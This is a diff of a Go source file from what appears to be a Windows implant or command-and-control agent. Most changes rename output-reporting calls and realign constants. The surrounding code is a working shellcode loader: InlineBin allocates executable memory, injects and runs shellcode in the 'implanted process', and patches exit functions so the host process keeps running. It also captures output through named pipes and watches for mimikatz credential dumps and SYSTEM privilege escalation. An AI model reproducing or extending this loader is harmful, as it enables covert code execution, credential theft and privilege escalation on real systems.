@@ -30,15 +30,15 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 	PAGE_EXECUTE_READ      = 0x20 // RX 执行（写入后切换）
 	// PAGE_READWRITE(0x04) 与 bof_windows.go 中定义一致，包级常量不可重名，直接复用
-	PROCESS_ALL_ACCESS = 0x001F0FFF
-	MEM_COMMIT         = 0x1000
-	MEM_RESERVE        = 0x2000
-	GENERIC_WRITE      = 0x40000000
-	FILE_SHARE_WRITE   = 0x00000002
-	CREATE_ALWAYS      = 2
+	PROCESS_ALL_ACCESS    = 0x001F0FFF
+	MEM_COMMIT            = 0x1000
+	MEM_RESERVE           = 0x2000
+	GENERIC_WRITE         = 0x40000000
+	FILE_SHARE_WRITE      = 0x00000002
+	CREATE_ALWAYS         = 2
 	FILE_ATTRIBUTE_NORMAL = 0x80
-	STD_OUTPUT_HANDLE      = -11
-	MEM_RELEASE            = 0x8000
+	STD_OUTPUT_HANDLE     = -11
+	MEM_RELEASE           = 0x8000
 )
 
 var (
@@ -54,7 +54,7 @@ var (
 	getModuleHandleA    = kernel32.NewProc("GetModuleHandleA")
 	getProcAddressProc  = kernel32.NewProc("GetProcAddress")
 	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
-	kernelVirtualFree     = kernel32.NewProc("VirtualFree")
+	kernelVirtualFree   = kernel32.NewProc("VirtualFree")
 	procVirtualProtect  = kernel32.NewProc("VirtualProtect")
 	procCreateNamedPipe = kernel32.NewProc("CreateNamedPipeW")
 	procReadFile        = kernel32.NewProc("ReadFile")
@@ -289,7 +289,7 @@ func VirtualAlloc(size int) (uintptr, error) {
 	pageSize := 4096
 	alignedSize := ((size + pageSize - 1) / pageSize) * pageSize
 
-	communication.DataProcess(0, []byte(fmt.Sprintf("[*] Allocating %d bytes (%d aligned) for execution", size, alignedSize)))
+	communication.ExecOutput([]byte(fmt.Sprintf("[*] Allocating %d bytes (%d aligned) for execution", size, alignedSize)))
 
 	ret, _, err := syscall.Syscall6(
 		procVirtualAlloc.Addr(), 4,
@@ -304,11 +304,11 @@ func VirtualAlloc(size int) (uintptr, error) {
 		lastError := windows.GetLastError()
 		errorMsg := fmt.Sprintf("VirtualAlloc failed: size=%d, alignedSize=%d, error=%v, lastError=%d",
 			size, alignedSize, err, lastError)
-		communication.DataProcess(0, []byte(fmt.Sprintf("[!] %s", errorMsg)))
+		communication.ExecOutput([]byte(fmt.Sprintf("[!] %s", errorMsg)))
 		return 0, fmt.Errorf("%s", errorMsg)
 	}
 
-	communication.DataProcess(0, []byte(fmt.Sprintf("[+] Memory allocated successfully at 0x%x", ret)))
+	communication.ExecOutput([]byte(fmt.Sprintf("[+] Memory allocated successfully at 0x%x", ret)))
 	return ret, nil
 }
 
@@ -334,12 +334,12 @@ func VirtualProtect(ptr uintptr, size int, protect uint32) error {
 }
 
 func InlineBin(buf []byte) ([]byte, error) {
-	communication.DataProcess(0, []byte("[*] Starting InlineBin execution..."))
+	communication.ExecOutput([]byte("[*] Starting InlineBin execution..."))
 
 	// 验证输入数据
 	if len(buf) == 0 {
 		errorMsg := "[!] Error: No data provided for execution"
-		communication.DataProcess(0, []byte(errorMsg))
+		communication.ExecOutput([]byte(errorMsg))
 		return []byte(errorMsg), fmt.Errorf("no data provided")
 	}
 
@@ -361,12 +361,12 @@ func InlineBin(buf []byte) ([]byte, error) {
 			"  - Tools already converted to shellcode format\n\n" +
 			"[*] Note: mimikatz works because it's often distributed as shellcode,\n" +
 			"         while fscan.exe is a standard PE that requires proper loading."
-		communication.DataProcess(0, []byte(errorMsg))
+		communication.ExecOutput([]byte(errorMsg))
 		return []byte(errorMsg), nil
 	}
 
-	communication.DataProcess(0, []byte(fmt.Sprintf("[*] Data size: %d bytes", len(buf))))
-	communication.DataProcess(0, []byte("[*] Detected shellcode format - proceeding with injection"))
+	communication.ExecOutput([]byte(fmt.Sprintf("[*] Data size: %d bytes", len(buf))))
+	communication.ExecOutput([]byte("[*] Detected shellcode format - proceeding with injection"))
 	handle, _ := windows.GetCurrentProcess()
 	// 临时劫持退出函数防止 shellcode 退出植入进程；执行结束后恢复，避免永久影响后续进程行为
 	patches := patchExit(uintptr(handle), true)
@@ -460,7 +460,7 @@ func InlineBin(buf []byte) ([]byte, error) {
 				return
 			case <-readTimeout:
 				log.Printf("[WARNING] Pipe reading timeout")
-				communication.DataProcess(0, []byte("[*] Pipe reading timeout - stopping output capture"))
+				communication.ExecOutput([]byte("[*] Pipe reading timeout - stopping output capture"))
 				return
 			case <-ticker.C:
 				output, err := ReadPipe(pipeHandle)
@@ -470,7 +470,7 @@ func InlineBin(buf []byte) ([]byte, error) {
 				}
 				if len(output) > 0 {
 					pipeResults <- output
-					communication.DataProcess(0, output)
+					communication.ExecOutput(output)
 				}
 			}
 		}
@@ -504,7 +504,7 @@ func InlineBin(buf []byte) ([]byte, error) {
 					}
 					if len(output) > 0 {
 						pipeResults <- output
-						communication.DataProcess(0, output)
+						communication.ExecOutput(output)
 					}
 				}
 			}
@@ -532,14 +532,14 @@ func InlineBin(buf []byte) ([]byte, error) {
 
 	// 记录执行开始时间
 	startTime := time.Now()
-	communication.DataProcess(0, []byte(fmt.Sprintf("[*] Starting shellcode execution at %s", startTime.Format("15:04:05"))))
+	communication.ExecOutput([]byte(fmt.Sprintf("[*] Starting shellcode execution at %s", startTime.Format("15:04:05"))))
 
 	// Execute shellcode using syscall.Syscall to avoid Go runtime interference
 	go func() {
 		defer func() {
 			if r := recover(); r != nil {
 				errorMsg := fmt.Sprintf("[!] Shellcode execution panic: %v", r)
-				communication.DataProcess(0, []byte(errorMsg))
+				communication.ExecOutput([]byte(errorMsg))
 				log.Printf("%s", errorMsg)
 			}
 			// 确保在执行完成后停止所有线程
@@ -565,10 +565,10 @@ func InlineBin(buf []byte) ([]byte, error) {
 		case err := <-executionDone:
 			if err != nil {
 				errorMsg := fmt.Sprintf("[!] %v", err)
-				communication.DataProcess(0, []byte(errorMsg))
+				communication.ExecOutput([]byte(errorMsg))
 				log.Printf("%s", errorMsg)
 			} else {
-				communication.DataProcess(0, []byte("[+] Shellcode execution completed"))
+				communication.ExecOutput([]byte("[+] Shellcode execution completed"))
 			}
 			// 【修复】执行完成后释放 RWX 内存，防止每次执行泄漏一个可执行区域
 			if ptr != 0 {
@@ -576,7 +576,7 @@ func InlineBin(buf []byte) ([]byte, error) {
 				log.Printf("[INFO] Shellcode memory freed: 0x%x", ptr)
 			}
 		case <-time.After(30 * time.Second):
-			communication.DataProcess(0, []byte("[*] Shellcode execution timeout - may be running in background"))
+			communication.ExecOutput([]byte("[*] Shellcode execution timeout - may be running in background"))
 			log.Printf("[WARNING] Shellcode execution timeout")
 			// 超时路径不释放内存：shellcode 可能仍在运行，释放会导致崩溃
 		}
@@ -598,7 +598,7 @@ func InlineBin(buf []byte) ([]byte, error) {
 		bytes.Contains(buf, []byte("privilege::debug"))
 
 	if isMimikatz {
-		communication.DataProcess(0, []byte("[*] Detected mimikatz-like tool - extending timeout and improving output capture"))
+		communication.ExecOutput([]byte("[*] Detected mimikatz-like tool - extending timeout and improving output capture"))
 	}
 
 	for {
@@ -612,7 +612,7 @@ func InlineBin(buf []byte) ([]byte, error) {
 			if bytes.Contains(output, []byte("nt authority\\system")) ||
 				bytes.Contains(output, []byte("SYSTEM")) ||
 				bytes.Contains(output, []byte("SeImpersonatePrivilege")) {
-				communication.DataProcess(0, []byte("[+] Privilege escalation detected!"))
+				communication.ExecOutput([]byte("[+] Privilege escalation detected!"))
 			}
 
 			// 检测 mimikatz 特有输出
@@ -620,14 +620,14 @@ func InlineBin(buf []byte) ([]byte, error) {
 				bytes.Contains(output, []byte("Session")) ||
 				bytes.Contains(output, []byte("Username")) ||
 				bytes.Contains(output, []byte("Domain")) {
-				communication.DataProcess(0, []byte("[+] Mimikatz credential output detected!"))
+				communication.ExecOutput([]byte("[+] Mimikatz credential output detected!"))
 			}
 
 		case err := <-pipeErrors:
 			errorCount++
 			log.Printf("[!] Pipe error %d: %v", errorCount, err)
 			if errorCount > 15 { // 增加错误容忍度
-				communication.DataProcess(0, []byte("[!] Too many pipe errors, execution may have completed"))
+				communication.ExecOutput([]byte("[!] Too many pipe errors, execution may have completed"))
 				goto cleanup
 			}
 
@@ -639,35 +639,35 @@ func InlineBin(buf []byte) ([]byte, error) {
 			if outputReceived {
 				heartbeatMsg := fmt.Sprintf("[*] Execution running for %v seconds, %d bytes captured, last output %v ago",
 					int(elapsedTime.Seconds()), len(allOutput), int(timeSinceLastOutput.Seconds()))
-				communication.DataProcess(0, []byte(heartbeatMsg))
+				communication.ExecOutput([]byte(heartbeatMsg))
 			} else {
 				heartbeatMsg := fmt.Sprintf("[*] Execution running for %v seconds, waiting for output...", int(elapsedTime.Seconds()))
-				communication.DataProcess(0, []byte(heartbeatMsg))
+				communication.ExecOutput([]byte(heartbeatMsg))
 			}
 
 			// 如果是 mimikatz 且长时间没有输出，给出特殊提示
 			if isMimikatz && elapsedTime > 10*time.Second && !outputReceived {
-				communication.DataProcess(0, []byte("[*] Mimikatz detected - output may appear after privilege acquisition"))
-				communication.DataProcess(0, []byte("[*] Please wait, some security tools take time to initialize..."))
+				communication.ExecOutput([]byte("[*] Mimikatz detected - output may appear after privilege acquisition"))
+				communication.ExecOutput([]byte("[*] Please wait, some security tools take time to initialize..."))
 			}
 
 			// 如果有输出但最近没有新输出，可能是执行完成
 			if outputReceived && timeSinceLastOutput > 8*time.Second && len(allOutput) > 100 {
-				communication.DataProcess(0, []byte("[*] No new output for 8 seconds, execution may be complete"))
+				communication.ExecOutput([]byte("[*] No new output for 8 seconds, execution may be complete"))
 				goto cleanup
 			}
 
 		case <-timeout:
-			communication.DataProcess(0, []byte("[*] Execution timeout reached (45 seconds)"))
+			communication.ExecOutput([]byte("[*] Execution timeout reached (45 seconds)"))
 			if len(allOutput) > 0 {
-				communication.DataProcess(0, []byte(fmt.Sprintf("[+] Captured %d bytes of output before timeout", len(allOutput))))
+				communication.ExecOutput([]byte(fmt.Sprintf("[+] Captured %d bytes of output before timeout", len(allOutput))))
 				// 直接输出捕获的内容以确保用户能看到
-				communication.DataProcess(0, []byte("\n=== CAPTURED OUTPUT ===\n"))
-				communication.DataProcess(0, allOutput)
-				communication.DataProcess(0, []byte("\n=== END OUTPUT ===\n"))
+				communication.ExecOutput([]byte("\n=== CAPTURED OUTPUT ===\n"))
+				communication.ExecOutput(allOutput)
+				communication.ExecOutput([]byte("\n=== END OUTPUT ===\n"))
 			} else {
-				communication.DataProcess(0, []byte("[!] No output captured - execution may have succeeded with privilege changes"))
-				communication.DataProcess(0, []byte("[*] Check system manually for execution results"))
+				communication.ExecOutput([]byte("[!] No output captured - execution may have succeeded with privilege changes"))
+				communication.ExecOutput([]byte("[*] Check system manually for execution results"))
 			}
 			goto cleanup
 		}
@@ -681,28 +681,29 @@ cleanup:
 	}
 
 	// 强制结束所有相关的goroutine，防止无限循环
-	communication.DataProcess(0, []byte("[*] Terminating all shellcode-related processes..."))
+	communication.ExecOutput([]byte("[*] Terminating all shellcode-related processes..."))
 
 	// 等待短时间让goroutine正常退出
 	time.Sleep(500 * time.Millisecond)
 
 	executionSummary := fmt.Sprintf("[*] InlineBin execution completed after %v seconds",
 		int(time.Since(startTime).Seconds()))
-	communication.DataProcess(0, []byte(executionSummary))
+	communication.ExecOutput([]byte(executionSummary))
 
 	if len(allOutput) > 0 {
 		// 输出最终结果的详细信息
 		finalMsg := fmt.Sprintf("[+] Execution completed successfully. Output length: %d bytes", len(allOutput))
-		communication.DataProcess(0, []byte(finalMsg))
+		communication.ExecOutput([]byte(finalMsg))
 
 		// 确保输出内容被发送 - 关键修复
-		communication.DataProcess(0, []byte("\n=== FINAL OUTPUT DUMP ===\n"))
-		communication.DataProcess(0, allOutput)
-		communication.DataProcess(0, []byte("\n=== END FINAL OUTPUT ===\n"))
+		communication.ExecOutput([]byte("\n=== FINAL OUTPUT DUMP ===\n"))
+		communication.ExecOutput(allOutput)
+		communication.ExecOutput([]byte("\n=== END FINAL OUTPUT ===\n"))
 
-		return allOutput, nil // 直接返回捕获的输出
+		// 输出已通过上面的 FINAL OUTPUT DUMP 发过；这里只返回简短摘要，
+		// 避免 dispatch 再发一遍造成插件页重复输出。
+		return []byte(fmt.Sprintf("[+] InlineBin completed: %d bytes captured", len(allOutput))), nil
 	}
 
 	return []byte("[*] Execution completed - no output captured (may indicate privilege changes or console output)"), nil
 }
-
